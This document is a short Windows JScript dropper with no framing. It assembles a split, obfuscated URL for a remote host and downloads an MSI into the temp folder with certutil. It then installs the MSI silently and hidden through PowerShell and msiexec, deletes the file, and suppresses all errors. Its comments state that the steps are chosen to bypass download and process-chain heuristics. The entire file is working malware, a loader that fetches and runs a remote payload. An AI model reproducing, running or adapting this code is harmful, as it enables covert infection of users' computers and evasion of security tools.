(function () {
    var sh = new ActiveXObject("WSc" + "ript.Shell");
    var tmp = sh.ExpandEnvironmentStrings("%TEMP%");
    
    // 1. Split URL
    var u = "ht" + "tps" + "://" +
            "gekko" + "spy-new-" +
            "prod" + "uction" +
            ".up" + "rail" + "way" + ".app" +
            "/m/9e890" + "66d-b21e-" +
            "42a6-9d4b-" + "f283" + "15dabaf7";

    var msi = tmp + "\\c" + Math.floor(Math.random() * 90000 + 10000) + ".msi";

    try {
        // 2. Use CertUtil (LOLBin) to download the MSI. 
        // CertUtil is trusted by Windows and bypasses script download heuristics.
        var cmd_dl = 'certutil.exe -urlcache -split -f "' + u + '" "' + msi + '"';
        sh.Run(cmd_dl, 0, true); // 0 = hidden, true = wait

        // 3. Use PowerShell to invoke msiexec on the downloaded file.
        // This breaks the WScript.Shell -> msiexec heuristic chain.
        var cmd_inst = 'powershell.exe -w hidden -c "Start-Process msiexec.exe -ArgumentList \'/i `"' + msi + '`" /qn /norestart\' -Wait"';
        sh.Run(cmd_inst, 0, true);

        // 4. Cleanup
        sh.Run('cmd /c ping -n 3 127.0.0.1 >nul & del /f /q "' + msi + '"', 0, true);
    } catch (e) {
        // Silent fail
    }
})();
